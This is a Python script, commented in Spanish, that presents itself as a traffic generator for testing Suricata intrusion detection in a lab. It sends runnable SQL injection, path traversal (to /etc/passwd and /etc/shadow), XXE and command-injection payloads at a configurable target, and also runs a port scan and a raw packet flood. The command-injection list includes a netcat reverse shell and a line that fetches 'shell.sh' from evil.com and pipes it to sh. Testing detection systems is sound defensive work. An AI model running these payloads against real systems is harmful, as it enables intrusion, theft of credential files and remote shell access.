#!/usr/bin/env python3
"""
==========================================================
  GENERADOR DE TRÁFICO MALICIOSO PARA SURICATA
  VulnDB-5G Testing Tool
==========================================================

Este script genera tráfico controlado para disparar
alertas en Suricata y probar el sistema de detección.

Uso:
    python3 generate_traffic.py --target 172.22.0.52 --attack sql
    python3 generate_traffic.py --target 172.22.0.52 --attack all
    python3 generate_traffic.py --help
"""

import socket
import time
import argparse
import sys
from urllib.parse import quote
import requests
import random

# Colores para output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    """Imprime banner del script"""
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("="*60)
    print("  🔥 SURICATA TRAFFIC GENERATOR")
    print("  VulnDB-5G Testing Tool")
    print("="*60)
    print(f"{Colors.ENDC}")


def sql_injection_attack(target, port=5000, count=120):
    """
    Genera tráfico de SQL Injection
    Dispara: CVE-2018-18702, CVE-2022-36161, CVE-2023-50429
    """
    print(f"\n{Colors.OKCYAN}[+] Ejecutando ataque SQL Injection...{Colors.ENDC}")
    print(f"    Target: {target}:{port}")
    print(f"    Packets: {count}")
    
    # Payloads SQL Injection típicos
    payloads = [
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND 1=1--",
        "' DROP TABLE users--",
        "admin' OR 1=1/*",
        "' OR 'x'='x",
        "1'; EXEC xp_cmdshell--",
    ]
    
    success = 0
    
    for i in range(count):
        try:
            payload = random.choice(payloads)
            
            # Enviar como query parameter
            url = f"http://{target}:{port}/api/v1/vulnerabilidades?search={quote(payload)}"
            
            response = requests.get(url, timeout=2)
            
            if i % 20 == 0:
                print(f"    Progress: {i}/{count} packets sent", end='\r')
            
            success += 1
            time.sleep(0.05)  # Pequeña pausa para no saturar
            
        except requests.exceptions.RequestException:
            # Es normal que falle, lo importante es que Suricata vea el tráfico
            success += 1
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Ataque interrumpido por usuario{Colors.ENDC}")
            break
    
    print(f"\n{Colors.OKGREEN}[✓] SQL Injection completado: {success}/{count} packets{Colors.ENDC}")
    return success


def path_traversal_attack(target, port=5000, count=120):
    """
    Genera tráfico de Path Traversal
    Dispara: CVE-2018-12045, CVE-2022-4272, CVE-2019-12146, CVE-2024-7903
    """
    print(f"\n{Colors.OKCYAN}[+] Ejecutando ataque Path Traversal...{Colors.ENDC}")
    print(f"    Target: {target}:{port}")
    print(f"    Packets: {count}")
    
    # Payloads Path Traversal
    payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../var/log/auth.log",
        "../../../../../../../etc/hosts",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    
    success = 0
    
    for i in range(count):
        try:
            payload = random.choice(payloads)
            
            # Enviar como path
            url = f"http://{target}:{port}/api/v1/file?path={quote(payload)}"
            
            response = requests.get(url, timeout=2)
            
            if i % 20 == 0:
                print(f"    Progress: {i}/{count} packets sent", end='\r')
            
            success += 1
            time.sleep(0.05)
            
        except requests.exceptions.RequestException:
            success += 1
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Ataque interrumpido por usuario{Colors.ENDC}")
            break
    
    print(f"\n{Colors.OKGREEN}[✓] Path Traversal completado: {success}/{count} packets{Colors.ENDC}")
    return success


def xxe_attack(target, port=5000, count=120):
    """
    Genera tráfico XXE (XML External Entity)
    Dispara: CVE-2017-3206, CVE-2017-3208
    """
    print(f"\n{Colors.OKCYAN}[+] Ejecutando ataque XXE...{Colors.ENDC}")
    print(f"    Target: {target}:{port}")
    print(f"    Packets: {count}")
    
    # Payload XXE típico
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>
    <user>&xxe;</user>
</data>"""
    
    success = 0
    
    for i in range(count):
        try:
            url = f"http://{target}:{port}/api/v1/upload"
            
            headers = {
                'Content-Type': 'application/xml'
            }
            
            response = requests.post(url, data=xxe_payload, headers=headers, timeout=2)
            
            if i % 20 == 0:
                print(f"    Progress: {i}/{count} packets sent", end='\r')
            
            success += 1
            time.sleep(0.05)
            
        except requests.exceptions.RequestException:
            success += 1
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Ataque interrumpido por usuario{Colors.ENDC}")
            break
    
    print(f"\n{Colors.OKGREEN}[✓] XXE Attack completado: {success}/{count} packets{Colors.ENDC}")
    return success


def rce_attack(target, port=5000, count=120):
    """
    Simula Remote Code Execution
    Dispara múltiples CVEs de "Ejecución remota"
    """
    print(f"\n{Colors.OKCYAN}[+] Ejecutando ataque RCE...{Colors.ENDC}")
    print(f"    Target: {target}:{port}")
    print(f"    Packets: {count}")
    
    # Payloads RCE
    payloads = [
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "; nc -e /bin/sh 172.22.0.54 4444",
        "| curl http://evil.com/shell.sh | sh",
        "`id`",
        "$(whoami)",
        "; ping -c 10 172.22.0.54",
    ]
    
    success = 0
    
    for i in range(count):
        try:
            payload = random.choice(payloads)
            
            # Enviar en parámetro "cmd"
            url = f"http://{target}:{port}/api/v1/exec?cmd={quote(payload)}"
            
            response = requests.get(url, timeout=2)
            
            if i % 20 == 0:
                print(f"    Progress: {i}/{count} packets sent", end='\r')
            
            success += 1
            time.sleep(0.05)
            
        except requests.exceptions.RequestException:
            success += 1
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Ataque interrumpido por usuario{Colors.ENDC}")
            break
    
    print(f"\n{Colors.OKGREEN}[✓] RCE Attack completado: {success}/{count} packets{Colors.ENDC}")
    return success


def raw_flood_attack(target, count=120):
    """
    Genera flood de paquetes TCP/UDP raw
    Dispara las reglas genéricas por threshold
    """
    print(f"\n{Colors.OKCYAN}[+] Ejecutando Packet Flood...{Colors.ENDC}")
    print(f"    Target: {target}")
    print(f"    Packets: {count}")
    
    success = 0
    
    try:
        # Crear socket raw
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        for i in range(count):
            try:
                # Enviar paquete vacío
                sock.sendto(b'', (target, 0))
                
                if i % 20 == 0:
                    print(f"    Progress: {i}/{count} packets sent", end='\r')
                
                success += 1
                time.sleep(0.01)
                
            except Exception:
                pass
        
        sock.close()
        
    except PermissionError:
        print(f"{Colors.FAIL}[!] Error: Se requieren permisos de root para raw sockets{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Ejecuta: sudo python3 {sys.argv[0]} ...{Colors.ENDC}")
        return 0
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Ataque interrumpido por usuario{Colors.ENDC}")
    
    print(f"\n{Colors.OKGREEN}[✓] Packet Flood completado: {success}/{count} packets{Colors.ENDC}")
    return success


def port_scan_attack(target, count=100):
    """
    Simula un port scan
    """
    print(f"\n{Colors.OKCYAN}[+] Ejecutando Port Scan...{Colors.ENDC}")
    print(f"    Target: {target}")
    print(f"    Ports: 1-{count}")
    
    success = 0
    
    for port in range(1, count + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            
            result = sock.connect_ex((target, port))
            
            if result == 0:
                print(f"    Port {port}: OPEN")
            
            sock.close()
            success += 1
            
            if port % 20 == 0:
                print(f"    Progress: {port}/{count} ports scanned", end='\r')
            
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Scan interrumpido por usuario{Colors.ENDC}")
            break
        except:
            pass
    
    print(f"\n{Colors.OKGREEN}[✓] Port Scan completado: {success}/{count} ports{Colors.ENDC}")
    return success


def run_all_attacks(target, port):
    """Ejecuta todos los ataques en secuencia"""
    print(f"\n{Colors.BOLD}{Colors.HEADER}[*] Ejecutando TODOS los ataques...{Colors.ENDC}\n")
    
    results = {}
    
    results['sql'] = sql_injection_attack(target, port, 120)
    time.sleep(2)
    
    results['path'] = path_traversal_attack(target, port, 120)
    time.sleep(2)
    
    results['xxe'] = xxe_attack(target, port, 120)
    time.sleep(2)
    
    results['rce'] = rce_attack(target, port, 120)
    time.sleep(2)
    
    results['scan'] = port_scan_attack(target, 100)
    time.sleep(2)
    
    # Raw flood solo si tiene permisos
    try:
        results['flood'] = raw_flood_attack(target, 120)
    except:
        print(f"{Colors.WARNING}[!] Raw flood omitido (requiere root){Colors.ENDC}")
        results['flood'] = 0
    
    return results


def print_summary(results):
    """Imprime resumen de resultados"""
    print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.HEADER}  📊 RESUMEN DE ATAQUES{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
    
    total_packets = sum(results.values())
    
    for attack, count in results.items():
        status = f"{Colors.OKGREEN}✓{Colors.ENDC}" if count > 0 else f"{Colors.FAIL}✗{Colors.ENDC}"
        print(f"  {status} {attack.upper():10s}: {count:4d} packets")
    
    print(f"\n  {Colors.BOLD}TOTAL:{Colors.ENDC} {total_packets} packets enviados\n")
    
    print(f"{Colors.OKCYAN}[i] Verifica los logs de Suricata:{Colors.ENDC}")
    print(f"    docker exec vulndb_suricata tail -f /var/log/suricata/eve.json")
    print(f"    # O en el host:")
    print(f"    tail -f ./runtime/suricata/logs/eve.json\n")


def main():
    parser = argparse.ArgumentParser(
        description='Generador de tráfico malicioso para Suricata',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  %(prog)s --target 172.22.0.52 --attack sql
  %(prog)s --target 172.22.0.52 --attack all
  %(prog)s --target 172.22.0.52 --attack rce --count 200
  %(prog)s --list-attacks
        """
    )
    
    parser.add_argument('--target', '-t', 
                       default='172.22.0.52',
                       help='IP del target (default: 172.22.0.52 - API)')
    
    parser.add_argument('--port', '-p',
                       type=int,
                       default=5000,
                       help='Puerto del target (default: 5000)')
    
    parser.add_argument('--attack', '-a',
                       choices=['sql', 'path', 'xxe', 'rce', 'scan', 'flood', 'all'],
                       default='all',
                       help='Tipo de ataque a ejecutar (default: all)')
    
    parser.add_argument('--count', '-c',
                       type=int,
                       default=120,
                       help='Número de paquetes a enviar (default: 120)')
    
    parser.add_argument('--list-attacks', '-l',
                       action='store_true',
                       help='Listar ataques disponibles y salir')
    
    args = parser.parse_args()
    
    if args.list_attacks:
        print("\nAtaques disponibles:")
        print("  sql   - SQL Injection")
        print("  path  - Path Traversal")
        print("  xxe   - XML External Entity")
        print("  rce   - Remote Code Execution")
        print("  scan  - Port Scanning")
        print("  flood - Packet Flooding (requiere root)")
        print("  all   - Ejecutar todos los ataques\n")
        sys.exit(0)
    
    print_banner()
    
    print(f"{Colors.BOLD}Configuración:{Colors.ENDC}")
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Attack: {args.attack}")
    print(f"  Count:  {args.count}")
    
    input(f"\n{Colors.WARNING}Presiona ENTER para comenzar el ataque...{Colors.ENDC}")
    
    results = {}
    
    if args.attack == 'all':
        results = run_all_attacks(args.target, args.port)
    elif args.attack == 'sql':
        results['sql'] = sql_injection_attack(args.target, args.port, args.count)
    elif args.attack == 'path':
        results['path'] = path_traversal_attack(args.target, args.port, args.count)
    elif args.attack == 'xxe':
        results['xxe'] = xxe_attack(args.target, args.port, args.count)
    elif args.attack == 'rce':
        results['rce'] = rce_attack(args.target, args.port, args.count)
    elif args.attack == 'scan':
        results['scan'] = port_scan_attack(args.target, args.count)
    elif args.attack == 'flood':
        results['flood'] = raw_flood_attack(args.target, args.count)
    
    print_summary(results)
    
    print(f"{Colors.OKGREEN}[✓] Script completado{Colors.ENDC}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Script interrumpido por usuario{Colors.ENDC}\n")
        sys.exit(1)